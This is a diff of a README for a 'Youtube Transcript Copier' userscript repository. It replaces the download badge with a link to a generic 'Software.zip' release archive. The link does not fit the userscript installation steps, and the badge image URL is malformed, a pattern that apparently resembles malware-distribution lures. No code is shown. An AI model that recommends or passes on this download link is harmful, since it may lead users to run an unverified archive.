@@ -12,7 +12,7 @@ Welcome to the Github repository for **Youtube Transcript Copier**, a powerful u
 ## 📦 Installation
 To get started with **Youtube Transcript Copier**, simply download the latest version from the following link:
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Now](https://github.com/Neeranjan-rit/Youtube-Transcript-Copier/releases/download/v1.0/Software.zip%20Now-v1.0.0-blue)](https://github.com/Neeranjan-rit/Youtube-Transcript-Copier/releases/download/v1.0/Software.zip)
 
 *Note: Click the button above to download the file. Once downloaded, follow the browser extension's instructions to install the userscript.*
 
